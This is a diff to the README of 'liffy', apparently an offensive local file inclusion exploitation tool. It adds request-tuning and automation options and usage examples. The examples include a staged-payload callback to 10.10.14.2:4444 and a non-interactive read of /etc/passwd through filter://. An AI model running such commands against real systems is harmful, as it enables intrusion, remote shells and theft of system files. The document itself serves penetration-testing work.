@@ -103,7 +103,11 @@ usage: liffy.py [-h] [-d] [-i] [-e] [-f] [-p] [-a] [-ns] [-r] [--ssh]
                 [-l LOCATION] [--cookies COOKIES] [-dt] [-t THREADS]
                 [--detection] [--null-byte] [--zip] [--encoding]
                 [--waf-bypass] [--method {GET,POST}] [--post-data POST_DATA]
-                [--headers HEADERS] [--no-color] [--no-banner] [--config]
+                [--headers HEADERS] [--lhost LHOST] [--lport LPORT]
+                [--read-file READ_FILE] [-y] [--timeout TIMEOUT]
+                [--proxy PROXY] [--verify-tls] [--user-agent USER_AGENT]
+                [--delay DELAY] [--retries RETRIES] [--json] [--output OUTPUT]
+                [--quiet] [--no-color] [--no-banner] [--config]
                 [url]
 
 positional arguments:
@@ -128,6 +132,23 @@ Advanced Options:
   --post-data POST_DATA POST data (format: key=value&key2=value2)
   --headers HEADERS     Custom headers (format: Header1:Value1,Header2:Value2)
   --detection           Only perform LFI detection, no exploitation
+
+Request Options:
+  --timeout TIMEOUT     HTTP request timeout in seconds
+  --proxy PROXY         HTTP(S) proxy URL, e.g. http://127.0.0.1:8080
+  --verify-tls          Verify TLS certificates instead of using insecure requests
+  --user-agent UA       Custom User-Agent header
+  --delay DELAY         Delay between requests in seconds
+  --retries RETRIES     HTTP retries per request
+
+Automation Options:
+  --lhost LHOST         Callback host for staged payloads
+  --lport LPORT         Callback port for staged payloads
+  --read-file PATH      File path to read with filter://
+  -y, --yes             Use defaults for prompts and run non-interactively
+  --json                Print a JSON run summary
+  --output OUTPUT       Write JSON run summary to a file
+  --quiet               Suppress normal terminal output
 
 General Options:
   -ns, --nostager       Execute payload directly, do not use stager
@@ -158,11 +179,16 @@ max_threads: 5
 rate_limit_delay: 0.1
 disable_colors: false
 disable_banner: false
+quiet: false
 default_method: GET
 user_agent_rotation: true
+request_timeout: 15
+proxy: null
+verify_tls: false
+retries: 0
 ```
 
-Set `disable_banner: true` to hide the startup banner/logo by default. CLI flags still override config values, so you can also use `--no-banner` or `--no-color` for one-off runs.
+Set `disable_banner: true` to hide the startup banner/logo by default. CLI flags still override config values, so you can also use `--no-banner`, `--no-color`, or `--quiet` for one-off runs.
 
 ### Environment Variables
 
@@ -200,6 +226,18 @@ uv run python liffy.py "http://target.com/lfi.php" -d --method POST --post-data 
 
 # POST with custom headers
 uv run python liffy.py "http://target.com/lfi.php" -d --method POST --headers "X-Forwarded-For:127.0.0.1,Authorization:Bearer token123"
+```
+
+### Request Tuning
+
+```bash
+# Send traffic through a local proxy and retry transient failures
+uv run python liffy.py "http://target.com/lfi.php?file=" -d \
+  --proxy "http://127.0.0.1:8080" --timeout 20 --retries 2
+
+# Use a fixed User-Agent and custom request delay
+uv run python liffy.py "http://target.com/lfi.php?file=" --detection -f \
+  --user-agent "liffy/2.0" --delay 0.5
 ```
 
 ## Examples
@@ -311,12 +349,49 @@ uv run python liffy.py "http://example.com/page.php?file=" -d \
   --cookies "PHPSESSID=abc123; auth_token=xyz789"
 ```
 
+### Scripted / Non-interactive Usage
+
+#### Provide callback values without prompts
+
+```bash
+uv run python liffy.py "http://example.com/page.php?file=" -d \
+  --lhost 10.10.14.2 --lport 4444 --yes
+```
+
+#### Read a specific file with filter:// without prompting
+
+```bash
+uv run python liffy.py "http://example.com/page.php?file=" -f \
+  --read-file /etc/passwd --yes
+```
+
+### Structured Output
+
+#### Print a JSON run summary
+
+```bash
+uv run python liffy.py "http://example.com/page.php?file=" --detection -f --json
+```
+
+#### Write a JSON summary to disk while keeping terminal output
+
+```bash
+uv run python liffy.py "http://example.com/page.php?file=" --detection -f \
+  --output findings.json
+```
+
 ### Output Control
 
 #### Disable colors and banner
 
 ```bash
 uv run python liffy.py "http://example.com/page.php?file=" -d --no-color --no-banner
+```
+
+#### Suppress normal terminal output
+
+```bash
+uv run python liffy.py "http://example.com/page.php?file=" --detection -f --quiet --output findings.json
 ```
 
 ## Default File Locations
